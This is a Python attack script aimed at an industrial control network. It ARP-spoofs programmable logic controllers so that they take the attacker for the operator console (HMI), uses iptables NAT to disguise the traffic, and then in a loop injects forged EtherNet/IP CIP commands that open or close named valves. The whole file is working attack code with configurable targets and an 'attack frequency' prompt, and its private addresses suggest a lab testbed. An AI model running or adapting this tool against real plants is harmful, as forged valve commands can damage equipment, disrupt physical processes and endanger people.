#!/usr/bin/env python3

"""
cip_injection_prompt.py
"""

import os
import sys
import time
import socket
import struct
from scapy.all import ARP, send, getmacbyip

###############################################################################
# Configuration
###############################################################################

ATTACKER_IP      = "10.0.0.200"
HMI_IP           = "10.0.0.150"
IP_FORWARD_FILE  = "/proc/sys/net/ipv4/ip_forward"
PLC_PORT         = 44818  # CIP (EtherNet/IP) port

# Dictionary of valves => CIP parameters.
VALVE_INFO = {
    "V100": {
        "plc_ip": "10.0.0.111",
        "symbol": b"V100_HMI:111",
        "fixed_data": b"\x05\x9d\x16\x00",
        "embedded_header": b"\x4d\x07",
    },
    "V200": {
        "plc_ip": "10.0.0.112",
        "symbol": b"V200_HMI:211",
        "fixed_data": b"\x05\x9d\x16\x00",
        "embedded_header": b"\x4d\x07",
    },
    "V300": {
        "plc_ip": "10.0.0.113",
        "symbol": b"V300_HMI:311",
        "fixed_data": b"\x05\x9d\x16\x00",
        "embedded_header": b"\x4d\x07",
    },
    "SV100": {
        "plc_ip": "10.0.0.101",
        "symbol": b"SV100_HMI:102",
        "fixed_data": b"\x05\x9d\x18\x00",
        "embedded_header": b"\x4d\x08",  # extra "\x00" needed
    },
    "SV200": {
        "plc_ip": "10.0.0.102",
        "symbol": b"SV200_HMI:202",
        "fixed_data": b"\x05\x9d\x18\x00",
        "embedded_header": b"\x4d\x08",
    },
    "SV300": {
        "plc_ip": "10.0.0.103",
        "symbol": b"SV300_HMI:302",
        "fixed_data": b"\x05\x9d\x18\x00",
        "embedded_header": b"\x4d\x08",
    },
}

# CIP open/close bytes
OPEN_COMMAND     = bytes.fromhex("c30001000100")
CLOSE_COMMAND    = bytes.fromhex("c30001000000")

###############################################################################
# System Helpers
###############################################################################

def run_cmd(cmd):
    print(f" [cmd] {cmd}")
    return os.system(cmd)

def enable_ip_forward():
    print("[*] Enabling IP forwarding...")
    run_cmd(f"echo 1 > {IP_FORWARD_FILE}")

def disable_ip_forward():
    print("[*] Disabling IP forwarding...")
    run_cmd(f"echo 0 > {IP_FORWARD_FILE}")

def add_nat_rule(attacker_ip, hmi_ip, plc_ip):
    """
    Attacker -> plc_ip => SNAT to HMI_IP
    """
    cmd = (
        f"iptables -t nat -A POSTROUTING "
        f"-s {attacker_ip} -d {plc_ip} -p tcp "
        f"-j SNAT --to-source {hmi_ip}"
    )
    run_cmd(cmd)

def remove_nat_rule(attacker_ip, hmi_ip, plc_ip):
    cmd = (
        f"iptables -t nat -D POSTROUTING "
        f"-s {attacker_ip} -d {plc_ip} -p tcp "
        f"-j SNAT --to-source {hmi_ip}"
    )
    run_cmd(cmd)

def get_mac(ip):
    return getmacbyip(ip)

def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Make 'target_ip' think 'spoof_ip' is at our attacker MAC.
    E.g. PLC sees us as HMI if target_ip=PLC, spoof_ip=HMI_IP
    """
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)

def restore_arp(target_ip, target_mac, real_ip, real_mac):
    """
    Restore correct ARP binding for 'target_ip' about 'real_ip'.
    """
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    send(pkt, count=3, verbose=False)

###############################################################################
# CIP Injection
###############################################################################

def cip_inject_command(plc_ip, symbol, fixed_data, embedded_header, valve_action="open"):
    """
    Connect CIP to (plc_ip, PLC_PORT) and send open/close for given CIP symbol.
    """
    if valve_action.lower().startswith('o'):
        cmd_bytes = OPEN_COMMAND
    else:
        cmd_bytes = CLOSE_COMMAND

    print(f"[*] CIP injection => {plc_ip}, valve={symbol.decode('ascii','ignore')}, {valve_action.upper()}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((plc_ip, PLC_PORT))
        #print(f"[+] CIP: connected to {plc_ip}:{PLC_PORT}.")  # less verbose
    except Exception as e:
        print(f"[!] Could not connect to PLC {plc_ip}:{PLC_PORT}: {e}")
        sock.close()
        return

    # 1) ENIP Register Session
    cip_register = struct.pack("<HHI I 8s I", 0x0065, 4, 0, 0, b"\x00"*8, 0)
    cip_register += struct.pack("<HH", 1, 0)
    sock.sendall(cip_register)

    try:
        reply = sock.recv(1024)
    except socket.timeout:
        print("[!] No reply from PLC for Register Session.")
        sock.close()
        return
    if len(reply) < 24:
        print("[!] Not a valid ENIP reply. CIP injection aborted.")
        sock.close()
        return

    new_session_handle = struct.unpack("<I", reply[4:8])[0]

    # 2) CIP Unconnected Send
    cip_cm_header = b"\x52\x02\x20\x06\x24\x01"
    ansi_segment  = b"\x91" + bytes([len(symbol)]) + symbol

    extra_padding = b"\x00" if embedded_header == b"\x4d\x08" else b""

    embedded_msg  = embedded_header + ansi_segment + extra_padding + cmd_bytes
    route_size    = b"\x01\x00"
    route_backpl  = b"\x01\x00"
    cip_cm_message= cip_cm_header + fixed_data + embedded_msg + route_size + route_backpl

    outer_header       = struct.pack("<I H H", 0, 8, 2)
    null_item          = struct.pack("<HH", 0x0000, 0)
    unconn_item_header = struct.pack("<HH", 0x00b2, len(cip_cm_message))
    unconnected_payload= outer_header + null_item + unconn_item_header + cip_cm_message

    data_len = len(unconnected_payload)
    encap_header = struct.pack(
        "<HHI I 8s I",
        0x006f,          # SendRRData
        data_len,
        new_session_handle,
        0,
        b"\x30" + b"\x00"*7,
        0
    )
    send_rr_payload = encap_header + unconnected_payload

    sock.sendall(send_rr_payload)
    try:
        resp = sock.recv(1024)
        # if resp: ...
    except socket.timeout:
        print("[!] CIP command timed out waiting for response.")

    sock.close()

###############################################################################
# Main
###############################################################################

def main():
    if os.geteuid() != 0:
        print("[!] Must run as root (sudo) for iptables & ARP. Exiting.")
        sys.exit(1)

    print("=== Ephemeral CIP Injection (Multi-Valve + Attack Loop) ===")

    # 1) Ask how many valves
    while True:
        try:
            num_valves = int(input("How many valves do you want to alter? ").strip())
            if num_valves <= 0:
                raise ValueError()
            break
        except ValueError:
            print("[!] Invalid number, must be > 0")

    # Collect (valve_name, action) in a list
    # Track distinct PLC IPs to do NAT for each
    tasks = []
    plc_ip_set = set()

    print("\nAvailable valves:", list(VALVE_INFO.keys()))
    for i in range(num_valves):
        print(f"\n--- Valve #{i+1} ---")
        while True:
            valve_name = input("Which valve name (e.g. V100, SV100)? ").strip().upper()
            if valve_name in VALVE_INFO:
                break
            else:
                print("[!] Unknown valve. Try again.")

        action = input("Open or Close this valve? [open/close]: ").strip().lower()
        if not action.startswith('o'):
            action = "close"

        tasks.append((valve_name, action))
        plc_ip_set.add(VALVE_INFO[valve_name]["plc_ip"])

    # 2) Ask user for loop frequency
    #    Store it as a float in seconds
    while True:
        freq_ms_str = input("\nEnter attack frequency in milliseconds (e.g. 2000): ").strip()
        try:
            freq_ms = float(freq_ms_str)
            if freq_ms <= 0:
                raise ValueError()
            break
        except ValueError:
            print("[!] Invalid frequency. Must be a positive number of ms.")

    interval_s = freq_ms / 1000.0
    print(f"[*] Will repeat CIP injection every {interval_s:.3f} seconds.")

    # 3) Enable IP forwarding
    enable_ip_forward()

    # 4) Add NAT for each distinct PLC IP
    for ip_dst in plc_ip_set:
        print(f"[*] Adding NAT rule for PLC {ip_dst}")
        add_nat_rule(ATTACKER_IP, HMI_IP, ip_dst)

    # 5) Perform ARP spoof
    plc_macs = {}
    for ip_dst in plc_ip_set:
        mac_dst = get_mac(ip_dst)
        if not mac_dst:
            print(f"[!] Could not get MAC for PLC {ip_dst}. CIP might fail.")
        else:
            plc_macs[ip_dst] = mac_dst
            print(f"[*] ARP spoofing PLC {ip_dst} => we are {HMI_IP}")
            arp_spoof(ip_dst, mac_dst, HMI_IP)

    # 6) Repeated CIP injection loop
    print(f"\n=== Repeated CIP injection loop (One-Way Spoof) ===")
    print("Press Ctrl+C to stop this loop and proceed with ARP restore + teardown.\n")
    try:
        while True:
            for (valve_name, action) in tasks:
                info = VALVE_INFO[valve_name]
                cip_inject_command(
                    plc_ip          = info["plc_ip"],
                    symbol          = info["symbol"],
                    fixed_data      = info["fixed_data"],
                    embedded_header = info["embedded_header"],
                    valve_action    = action
                )
            # Sleep the user-chosen interval before next wave of CIP commands
            time.sleep(interval_s)

    except KeyboardInterrupt:
        print("\n[!] Attack loop interrupted by user.")
    # Proceed to ARP restore, NAT remove, etc.

    # 7) Prompt if user wants a thorough ARP restore on both sides
    answer = input("\nDo you want to restore ARP on both sides now? [y/N]: ").strip().lower()
    if answer == 'y':
        # restore PLC -> HMI
        for ip_dst, mac_dst in plc_macs.items():
            real_hmi_mac = get_mac(HMI_IP)
            if real_hmi_mac:
                print(f"[*] Restoring ARP for PLC {ip_dst} => real HMI {HMI_IP}")
                restore_arp(ip_dst, mac_dst, HMI_IP, real_hmi_mac)
    # 8) Remove NAT, disable IP forwarding
    print("\n[*] Removing NAT rules, disabling IP forward...")
    for ip_dst in plc_ip_set:
        remove_nat_rule(ATTACKER_IP, HMI_IP, ip_dst)
    disable_ip_forward()

    print("[*] Done. The network is back to normal. Bye!")

if __name__ == "__main__":
    main()

